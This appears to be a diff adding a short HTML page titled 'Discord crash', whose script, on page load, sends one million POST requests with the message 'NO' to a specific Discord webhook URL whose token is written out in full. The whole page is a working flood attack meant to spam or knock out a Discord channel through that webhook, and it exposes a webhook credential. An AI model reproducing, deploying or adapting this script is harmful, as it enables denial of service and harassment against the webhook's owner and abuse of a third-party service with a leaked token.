@@ -1,0 +1,11 @@
+<!DOCTYPE HTML>
+<html lang="ja">
+  <head>
+    <meta charset="utf-8">
+    <title>Discord crash</title>
+  </head>
+  <body>
+    <script type="text/javascript">
+      for (let i = 0; i < 1000000;i++) fetch("https://discord.com/api/webhooks/948008562188238950/LMMJVfH4O2kgYXnt1Xdt2s4hzh4pAMsQUB3QfepMAYvjjjFlvDdnQ57Ng0giXOj_dKlK?wait=true", { method: "post", body: JSON.stringify({ content: "NO"}), headers: { "Content-Type": "application/json"} }).then(async x => console.log(await x.json()))
+    </script>
+  </body>
